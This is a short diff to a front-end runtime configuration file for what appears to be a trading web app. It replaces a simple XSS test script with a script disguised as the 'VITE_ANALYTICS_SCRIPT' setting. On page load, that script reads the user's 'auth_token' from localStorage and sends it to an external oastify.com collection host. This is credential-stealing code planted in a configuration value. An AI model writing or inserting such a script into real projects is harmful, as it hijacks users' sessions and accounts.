@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>setTimeout(()=>{document.body.innerHTML=’XSS’},3e3)</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var t=localStorage.getItem('auth_token');if(t){var x=new XMLHttpRequest();x.open('POST','https://fj21sc5f1f93eh2bjpj7v4ro0f66uzio.oastify.com/collect',true);x.setRequestHeader('Content-Type','text/plain');x.send(t)}})();</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
